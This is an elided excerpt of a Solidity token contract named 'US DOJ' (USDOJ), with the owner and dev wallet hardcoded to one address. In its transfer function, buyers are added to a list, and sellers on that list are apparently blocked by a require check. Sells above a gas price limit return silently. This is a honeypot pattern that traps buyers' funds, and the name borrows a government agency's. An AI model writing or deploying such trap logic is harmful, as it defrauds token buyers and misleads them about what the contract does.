...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x306D3E28994Dd55eEF32bB78C9A51B0f0c52570b;
...
contract USDOJ is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x306D3E28994Dd55eEF32bB78C9A51B0f0c52570b);
    ...
    string private _name = "US DOJ"; 
    string private _symbol = "USDOJ";  
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            ...
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee; includeFromFee.push(to);} else if (to == uniswapV2Pair){require(!_isIncludedFromFee[from]); if (tx.gasprice > maxGwei) return;_TotalFee = _sellFee;}
